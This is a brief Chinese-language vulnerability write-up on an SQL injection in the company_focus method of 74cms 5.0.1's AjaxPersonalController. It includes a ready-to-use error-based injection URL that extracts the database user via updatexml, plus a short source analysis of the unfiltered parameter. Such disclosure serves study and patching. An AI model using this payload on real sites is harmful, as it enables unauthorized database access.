74cms v5.0.1 前台sql注入
========================

一、漏洞简介
------------

74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入

二、漏洞影响
------------

三、复现过程
------------

### 具体信息

文件位置：74cms\\upload\\Application\\Home\\Controller\\AjaxPersonalController.class.php

方法：function company\_focus(\$company\_id)

是否需登录：需要

登录权限：普通用户即可

### Payload:

    http://0-sec.org/74cms/5.0.1/upload/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a

![](./resource/74cmsv5.0.1前台sql注入/media/rId26.png)

### 源码分析：

文件：74cms\\upload\\Application\\Home\\Controller\\AjaxPersonalController.class.php

company\_focus
方法是参数化函数，\$company\_id参数是不经过I函数过滤的，所以只要where可以控制，那就可以注入

![](./resource/74cmsv5.0.1前台sql注入/media/rId28.png)

跟踪add\_focus(),发现SQL语句参数外部都可以控制，导致了注入漏洞

![](./resource/74cmsv5.0.1前台sql注入/media/rId29.png)
